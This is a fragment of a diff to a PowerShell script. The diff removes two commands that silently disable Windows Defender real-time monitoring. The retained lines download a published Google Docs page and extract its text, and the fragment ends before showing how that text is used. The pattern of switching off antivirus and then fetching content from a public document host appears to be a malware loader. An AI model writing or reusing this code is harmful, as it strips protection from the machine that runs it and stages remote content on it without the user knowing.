@@ -1,5 +1,3 @@
-Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue
-Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
 
 $response_html = Invoke-WebRequest -Uri "https://docs.google.com/document/d/e/2PACX-1vT35P2otFME7gb2oP-tqkQmCAaajGwfpKt8Z13-ic3t9tZwCwZN0CNyonzeJasCnDXJ6ob0HK3t6JG-/pub"
 $response_text = $response_html.ParsedHtml.body.innerText
